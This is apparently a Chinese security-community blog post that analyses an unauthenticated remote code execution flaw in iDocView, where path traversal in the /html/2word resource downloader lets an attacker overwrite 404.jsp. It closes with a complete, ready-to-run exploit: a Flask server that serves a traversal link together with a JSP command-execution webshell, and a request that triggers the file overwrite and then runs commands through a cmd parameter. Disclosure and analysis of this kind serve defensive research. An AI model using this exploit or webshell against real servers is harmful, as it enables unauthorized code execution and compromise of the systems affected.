---
title: IDocView前台远程代码执行漏洞分析
date: 2023-12-04 10:26:29
tags: ['奇安信攻防社区', '漏洞分析']
---

IDocView前台远程代码执行漏洞分析细节
<meta name="referrer" content="no-referrer"/> 
<!--more--> 
<div class="markdown-body"><p blockindex="0"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-bc20688be4c26afbeeb5ed389491b63a660386dc.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="1">昨天注意到一个IDocView系统的漏洞被披露了，发现是几个月之前审计过的漏洞，这里和师傅们分享一下当时的漏洞分析记录。</p>
<h2 blockindex="2">影响范围</h2>
<p blockindex="3">iDocView &lt; 13.10.1_20231115</p>
<h2 blockindex="4">漏洞原理</h2>
<p blockindex="5">漏洞原理大概就是使用未过滤的接口进行远程文件下载，会对传入的url进行下载，并且会解析url对应源码标签中的链接标签并且进行下载，而标签链接解析下载的过程中存在路径过滤缺陷导致任意文件上传。</p>
<h2 blockindex="6">过滤检查</h2>
<p blockindex="7">IDocView通过Tomcat+Spring-Mvc布置在Windows中，请求接口过滤通过继承于org.springframework.web.servlet.handler.HandlerInterceptorAdapter的com.idocv.docview.interceptor.ViewInterceptor进行定义，</p>
<p blockindex="8">com.idocv.docview.interceptor.ViewInterceptor#preHandle 是任何请求都会调用的过滤函数，主要会对文件预览、文件上传、文件下载功能接口进行身份验证。</p>
<p blockindex="9">且com.idocv.docview.interceptor.ViewInterceptor#thdViewCheckSwitch=false 不会进行upload和download接口进行身份验证。</p>
<p blockindex="10"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-1b7cde22fa9f11fbe65f709d5eb52a3d5ad686f5.png" alt="" referrerpolicy="no-referrer"></p>
<h2 blockindex="11">漏洞入口</h2>
<p blockindex="12">/html/2word对应的入口函数为com.idocv.docview.controller.HtmlController#toWord</p>
<p blockindex="13"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-a846c6f5159ecba7df2c96a3172ee310f3cc0b42.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="14">函数大致流程如下：</p>
<ol blockindex="15">
<li>计算url的md5值作为子目录名</li>
<li>判断子目录是否存在，不存在则根据url链接下载资源</li>
<li>判断是否存在文件md5Url + ".docx"是否存在</li>
<li>不存在则通过pandoc.exe生成md5Url + ".docx"文件</li>
<li>返回md5Url + ".docx"文件</li>
</ol>
<p blockindex="16">其中关键函数为下载资源的com.idocv.docview.util.GrabWebPageUtil#downloadHtml</p>
<p blockindex="17"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-f1b734d5817f5c50fdc200e66425f146f34aaf2f.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="18">传入url到downloadHtml函数后首先是会对getWebPage进行文件下载</p>
<p blockindex="19">（函数较长所以分几个部分截图了）</p>
<p blockindex="20">首先是进行一些请求的header设置</p>
<p blockindex="21"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-62c8d1347a88595dff9bba54c49ea84e07fd9d31.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="22">下面会下载url文件源码内容后进行一些格式解析处理后写入到url链接中指定的文件名中</p>
<p blockindex="23"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-780263af0ef72c4f64a781f9b64a8edd1b976ff8.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="24">看到这里之前审计的时候发现有asp、aspx、php这些可能为webshell格式的过滤而没有过滤jsp后缀。传入第二个参数中的outputDir指定了目录，而这个目录并不能被我们直接通过url指定；同时下载的文件名在第三个参数指定为index.html，所以下载文件的位置并不能给我们指定。</p>
<p blockindex="25"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-08f9074547208b5655dbd1c58b875ef7a378b1f5.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="26">问题并不是出在第一次执行的getWebPage</p>
<h2 blockindex="27">远程文件下载</h2>
<p blockindex="28">com.idocv.docview.util.GrabWebPageUtil#getWebPage(java.net.URL, java.io.File, java.lang.String)</p>
<p blockindex="29">在第一次下载url内容的时候并不能进行利用，但是在下面再次调用了getWebPage函数</p>
<p blockindex="30"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-351f30bd584f6c112847841842404be5d48fca61.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="31">这里的双参数和三参数的getWebPage是一样的，双参数将最后一个保存文件名进行指定，如果第三个参数未指定，则会根据url获得最后一个/之后的字符串作为文件名</p>
<pre blockindex="32"><code class="hljs language-Java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getWebPage</span><span class="hljs-params">(URL obj, File outputDir)</span> </span>{
   getWebPage(obj, outputDir, (String)<span class="hljs-keyword">null</span>);
}
</code></pre>
<pre blockindex="33"><code class="hljs language-Java">String path = obj.getPath();
String filename = path.substring(path.lastIndexOf(<span class="hljs-number">47</span>) + <span class="hljs-number">1</span>);
<span class="hljs-keyword">if</span> (filename.equals(<span class="hljs-string">"/"</span>) || filename.equals(<span class="hljs-string">""</span>)) {
   filename = <span class="hljs-string">"default.html"</span>;
}
System.out.println(filename);
<span class="hljs-keyword">if</span> (StringUtils.isNotBlank(fileName)) {
   filename = fileName;
}
</code></pre>
<p blockindex="34">而之后在这个For循环中的链接是源自于第一次从链接中下载的页面源码，并且从中解析出img、link、script中的指定加载的远程连接文件，且解析后的链接会加入到GrabUtility.<em>filesToGrab中。</em></p>
<p blockindex="35">录入访问链接<a href="http://host:port/links.html%E8%BF%94%E5%9B%9E%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BA%EF%BC%9A">http://host:port/links.html返回的内容为：</a></p>
<pre blockindex="36"><code class="hljs language-Java">&lt;img src=<span class="hljs-string">"https://host:port/1.png"</span>&gt;
</code></pre>
<p blockindex="37">那么1.png图片就会下载于md5为名的子目录下：</p>
<p blockindex="38"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-3baa001ca9833453a9bdb251644a0c7c6319b981.png" alt="" referrerpolicy="no-referrer"></p>
<h2 blockindex="39">Poc构建</h2>
<p blockindex="40">到这里攻击流程其实就已经可以进行webshell文件上传了：</p>
<ol blockindex="41">
<li>
<p>web服务器里面存放一个links.html文件写入带着目录穿越路径的url链接：</p>
<pre><code class="hljs language-Java">&lt;link href=<span class="hljs-string">"http://127.0.0.1:5050/..\..\..\..\docview\\WEB-INF\\views\\404.jsp"</span>&gt;
</code></pre>
</li>
<li>
<p>访问<code>/docview/html/2word</code>传入url=<a href="http://server-host/links.html">http://server-host/links.html</a></p>
</li>
<li>
<p>受害服务器下载links.html文件并且解析出link 标签的下载文件路径<code>..\..\..\..\docview\\WEB-INF\\views\\404.jsp</code>并且将文件名通过目录拼接的方式保存到本地</p>
</li>
<li>
<p>web服务器里面定义路由，当访问<code>..\..\..\..\docview\\WEB-INF\\views\\404.jsp</code>路径的时候，返回一个webshell文件</p>
</li>
<li>
<p>最后访问一个任意IdocView不存在的路由就会加载覆盖后的404.jspwebshell文件</p>
</li>
</ol>
<pre blockindex="42"><code class="hljs language-Java"><span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests
from flask <span class="hljs-keyword">import</span> Flask, request
app = Flask(__name__)
raw_404_page=<span class="hljs-string">"404 Page Text"</span>
jsp_webshell = <span class="hljs-string">""</span><span class="hljs-string">"
&lt;!-- request with Parameter 'cmd'--&gt;
&lt;%@ page import="</span>java.io.*<span class="hljs-string">" %&gt;
&lt;%
   String cmd = request.getParameter("</span>cmd<span class="hljs-string">");
   String output = "</span><span class="hljs-string">";
   if(cmd != null) {
  String s = null;
  try {
 Process p = Runtime.getRuntime().exec(cmd,null,null);
 BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
 while((s = sI.readLine()) != null) { output += s+"</span>&lt;/br&gt;<span class="hljs-string">"; }
  }  catch(IOException e) {   e.printStackTrace();   }
   }
%&gt;
&lt;%=output %&gt;"</span><span class="hljs-string">""</span>
<span class="hljs-meta">@app</span>.route(<span class="hljs-string">'/&lt;path:path&gt;'</span>)
<span class="hljs-function">def <span class="hljs-title">serve_content</span><span class="hljs-params">(path)</span>:
<span class="hljs-keyword">if</span> "jsp" in request.url:
return raw_404_page + jsp_webshell
elif "links" in request.url:
return  f"""&lt;link href</span>=<span class="hljs-string">"http://127.0.0.1:5050/..\\..\\..\\..\\docview\\WEB-INF\\views\\404.jsp"</span>&gt;<span class="hljs-string">""</span><span class="hljs-string">"
else:
return 'who are you???'
def exp(host):
time.sleep(5)
url = host + '/html/2word'
r = requests.post(url,
  data={
  "</span>url<span class="hljs-string">": f"</span>http:<span class="hljs-comment">//127.0.0.1:5050/links.html_{random.Random().randint(0, 1000000)}"</span>
  })
print(r.status_code)
print(r.text)
requests.get(host+<span class="hljs-string">"/xxx?cmd=calc"</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
threading.Thread(target=exp,args=(<span class="hljs-string">"http://192.168.92.1:8080/docview"</span>,)).start()
app.run(port=<span class="hljs-number">5050</span>,debug=True,host=<span class="hljs-string">'0.0.0.0'</span>)
</code></pre>
<p blockindex="43"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-687945e158d353471e8a16424d6beff5fe3e7cfc.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="44">这是执行命令前访问/xxx?cmd=whoami的结果</p>
<p blockindex="45"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-13621abcdd18891fc53c073e7391ab9bf4b1d0d8.png" alt="" referrerpolicy="no-referrer"></p>
<p blockindex="46">执行脚本后404页面变化执行命令输出回显</p>
<p blockindex="47"><img src="https://shs3.b.qianxin.com/attack_forum/2023/11/attach-dc5637e07644b58b1d4e0090d72b4c15646b1d9c.png" alt="" referrerpolicy="no-referrer"></p><!--1--></div><br>
<div class="declare">
      <ul class="post-copyright">
        <li>
          <strong>本文作者：</strong>
          markin
        </li>
        <li>
          <strong>本文来源：</strong>
          <a href="https://forum.butian.net/" title="本文来源" target="_blank">奇安信攻防社区</a>
        </li>
        <li>
          <strong>原文链接：</strong>
          <a href="https://forum.butian.net/share/2598" title="原文链接" target="_blank">https://forum.butian.net/share/2598</a>
        </li>
        <li>
          <strong>版权声明： </strong>
          除特别声明外，本文各项权利归原文作者和发表平台所有。转载请注明出处！
        </li>
      </ul>
</div>
    